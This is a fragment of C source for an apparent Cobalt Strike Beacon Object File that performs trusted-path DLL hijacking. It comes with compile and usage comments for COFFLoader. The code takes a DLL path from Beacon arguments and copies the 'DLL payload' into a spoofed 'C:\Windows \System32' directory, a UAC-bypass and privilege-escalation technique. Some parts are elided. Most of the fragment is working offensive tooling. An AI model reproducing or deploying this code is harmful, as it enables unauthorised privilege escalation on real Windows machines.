//x86_64-w64-mingw32-gcc -c TrustedPathDLLHijackBOF_FileOnDisk.c -w -o /share/test.o
// Usage: .\COFFLoader64.exe go .\test.o 2f0000002b000000433a5c55736572735c72616e64795c4465736b746f705c746573745c6d657373616765626f782e646c6c00
#include <windows.h>
#include <wtsapi32.h>
#include <shellapi.h>
#include <shlobj.h>
...
void go(char * args, unsigned long length)
{
    ...
    unsigned char * dllToLoad = BeaconDataExtract(&parser, NULL);
    char targetDLLPath[MAX_PATH] = {0};
    MSVCRT$strcpy(targetDLLPath, dllToLoad);
    ...
    // copy supplied DLL to "C:\Windows \System32" directory
    KERNEL32$CopyFileA(targetDLLPath, (LPCTSTR)newDLLLocation, FALSE);
    if(KERNEL32$GetLastError()!=0){
        BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the DLL payload to the destination.\n", KERNEL32$GetLastError());
        goto FileCleanup;
        return;
    }else{
